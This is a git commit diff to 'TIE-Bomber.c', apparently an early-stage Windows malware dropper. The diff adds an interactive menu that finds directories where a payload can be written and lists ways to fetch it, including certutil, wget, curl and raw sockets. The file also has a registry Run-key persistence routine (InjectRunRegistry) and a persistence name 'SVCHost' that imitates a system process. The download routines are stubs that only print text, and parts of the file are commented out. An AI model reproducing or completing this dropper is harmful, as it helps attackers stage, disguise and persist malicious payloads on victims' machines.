21d3b5fdeaa2fd12bcc1b942e6abd18a521cfbc8
yusufsaka007 <yusufsaka5481@gmail.com>
2025-06-30 20:27:17 +0000

    Going sooo slow lmfaoo

--- TIE-Bomber.c
+++ TIE-Bomber.c
@@ -3,13 +3,78 @@
 #include <string.h>
 #include <unistd.h>
 #include <windows.h>
+#include <stdarg.h>
 
 #define PERS_NAME "SVCHost"
 #define MAX_URL 2048
+#define MAX_FILE 255
+
+#define WIN_ERROR 0x0
+#define CONTINUE_ERROR 0x1 
+#define FAIL_ERROR 0x2
+#define SUCCESS 0x3
+
+typedef int (*ValidatorFunc)(char *arg, void *data);
+
+VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);
+
+VOID _ListOpts(const char *str, ...);
+#define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)
+
+#define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);
 
 typedef struct _WRITABLE_DIR {
-    char path[MAX_PATH];
+    char path[MAX_PATH + 1];
 } WRITABLE_DIR, *PWRITABLE_DIR;
+
+static BOOL printHelp = TRUE;
+
+VOID _ListOpts(const char *str, ...) {
+    int o=0;
+    va_list arg;
+    va_start(arg, str);
+    for (int i=0;i<20;i++) printf("%c", '-');
+    printf("\n\n");
+    printf("[0]: Just give me something that works\n");
+    while (str) {
+        printf("[%d]: %s\n", ++o, str);
+        str = va_arg(arg, const char *);
+    }
+    printf("[h]: List options again\n");
+    printf("[q]: Quit program\n\n");
+
+    for (int i=0;i<20;i++) printf("%c", '-');
+    printf("\n\n");
+
+    va_end(arg);
+}
+
+BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
+    int rc;
+
+    while (TRUE) {
+        printf("TIE-Bomber(%s) > ", prompt);
+        fflush(stdout);
+        fgets(buffer, (int)bufferSize, stdin);
+        buffer[strcspn(buffer, "\n")] = '\0';
+        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0) {
+                printf("[*] Exiting...\n");
+                return FALSE;
+        }
+        if (strcmp(buffer, "h") == 0) {
+            printHelp = TRUE;
+        }
+
+        rc = validator(buffer, data);
+        if (rc == WIN_ERROR) {
+            TranslateErrorPrint(GetLastError());
+            continue;
+        } else if (rc == CONTINUE_ERROR || rc == FAIL_ERROR) {
+            continue;
+        }
+        break;
+    }
+}
 
 BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
     if (*count >= *capacity) {
@@ -20,45 +85,12 @@ BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char 
             return FALSE;
         }
     }
-
+    
     strncpy((*array)[*count].path, path, pathLen);
     (*array)[*count].path[pathLen] = '\0';
     (*count)++;
-}
 
-BOOL HasWriteAccess(PHANDLE pToken, LPCWSTR dirPath) {
-    // Get security security descriptor
-    BYTE sdBuffer[1024];
-    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR) sdBuffer;
-    DWORD sdSize;
-
-    if (!GetFileSecurityW(dirPath, DACL_SECURITY_INFORMATION, pSD, sdSize, &sdSize)) {
-        return FALSE;
-    }
-
-    GENERIC_MAPPING mapping = { FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_GENERIC_EXECUTE, FILE_ALL_ACCESS};
-    PRIVILIGE_SET priviliges;
-    DWORD privLen = sizeof(priviliges);
-    DWORD granted;
-    BOOL access;
-
-    MapGenericMask(&FILE_GENERIC_WRITE, &mapping);
-    if (!AccessCheck(pSD, pToken, FILE_GENERIC_WRITE, &mapping, &priviliges, &privLen, &granted, &access)) {
-        return FALSE;
-    }
-    return access;
-}
-
-BOOL GetWritableDirs(WRITABLE_DIR **wdirs, int *count, int *capacity) {
-    // Get user token
-    HANDLE uToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
-        printf("[-] Failed to get user's token\n");
-        return FALSE;
-    }
-    
-
-    CloseHandle(token);
+    return TRUE;
 }
 
 VOID TranslateError(DWORD errCode, char **pErrMessage) {
@@ -72,11 +104,18 @@ VOID TranslateError(DWORD errCode, char **pErrMessage) {
 	    NULL);
 }
 
+VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
+    char* errMsg;
+    TranslateError(errCode, &errMsg);
+    fprintf(stderr, "[-] ERROR at %s:%d: %lu - %s", file, line, errCode, errMsg);
+    LocalFree(errMsg);
+}
+
 BOOL FileExists(const char *path) {
 	DWORD attrib = GetFileAttributesA(path);
 	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
 }
-
+    
 BOOL IsExecutable(const char *path) {
 	DWORD binaryType;
 	LSTATUS stat = GetBinaryTypeA((LPCSTR)path, (LPDWORD)&binaryType);
@@ -93,8 +132,85 @@ BOOL IsExecutable(const char *path) {
 	return TRUE;
 }
 
-BOOL DownloadUrl(const char* source) {
+BOOL DownloadFromUrl(const char* source) {
+    printf("[+] Downloading the payload using Win32 API\n");
+    return FALSE;
+}
+
+BOOL DownloadWget(const char *source) {
+    printf("[+] Downloading the payload using wget\n");
     return TRUE;
+}
+
+int HandleDownload(char* opt, void *data) {
+    char *src = (char*) data;
+    if (printHelp) {
+        ListOpts(
+            "Download using Win32 API", 
+            "Download using certutil.exe", 
+            "Download using wget", 
+            "Download using curl",
+            "Download using raw TCP sockets"  
+        );
+        printHelp = FALSE;
+        return CONTINUE_ERROR;
+    }
+
+    switch ((char) *opt) {
+        case '0':
+           break; 
+        case '1':
+            if (!DownloadFromUrl(src)) {
+                return FAIL_ERROR;
+            }
+            return SUCCESS;
+        case '2':
+            break;
+        case '3':
+            if (!DownloadWget(src)) {
+                return FAIL_ERROR;
+            }
+            return SUCCESS;
+        case '4': 
+            break;
+        case '5':
+            break;
+        default:
+            printf("[?] Unknown option specified. Select <h> for available options\n");
+            return -1;
+            break;
+    }
+}
+
+int HasWriteAccess(char *dirPath, void *data) {
+    (void) data;
+
+    char testPath[MAX_PATH + 1];
+    if (dirPath[strlen(dirPath) - 1] != '\\') {
+        dirPath[strlen(dirPath)] = '\\';
+    }
+    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
+    
+    wchar_t wTestPath[MAX_PATH + 1];
+    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);
+
+
+    HANDLE hFile = CreateFileW(
+        wTestPath,
+        FILE_WRITE_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return WIN_ERROR;
+    }
+
+    CloseHandle(hFile);
+    return SUCCESS;
 }
 
 BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
@@ -216,14 +332,20 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
 int main(int argc, char* argv[]) {
 	char malwareFull[MAX_PATH];
 	int malwareFullLen;
-	char exe[MAX_PATH];
-	char ip[256];
-    char target[MAX_PATH];
+	char exe[MAX_FILE + 1];
+    char ip[256];
+    char target[MAX_FILE + 1];
     int ipLen;
 	int exeLen;
     int targetLen; 
     int port; 
-    char source[MAX_URL];
+    char source[MAX_URL + 1];
+    char targetDir[MAX_PATH + 1];
+    char opt[16];
+
+    char *errMsg;
+    DWORD errCode;
+
     WRITABLE_DIR *wdirs = NULL;
     int capacity = 16, count = 0;
 
@@ -236,10 +358,17 @@ int main(int argc, char* argv[]) {
 	printf("[*] Source to extract payload from: %s\n", source);
     printf("[*] Payload will be uploaded as: %s\n", target);
 
-    // List available writable directories
-    printf("[*] Listing available directories...\n\n");
-    
-	/*
+    if (!PromptUntilValid("Target Directory", targetDir, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
+        exit(1); 
+    }
+    printf("[+] Payload will be dropped to %s\n", targetDir);
+    printf("\n\n[*] **DOWNLOAD OPTION**\n\n"); 
+    HandleDownload(NULL, NULL);
+    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, source)) {
+        exit(1);
+    }
+    printf("\n\n[*] **PERSISTENCE OPTION**\n\n"); 
+/*
 	if (!FileExists(malware)) {
 	    printf("[-] The malware does not exists\n");
 	    return 1;
@@ -269,6 +398,6 @@ int main(int argc, char* argv[]) {
 	    return 0;
 	}
 	*/
-    free(wdirs);
+    
 	return 0;
 }
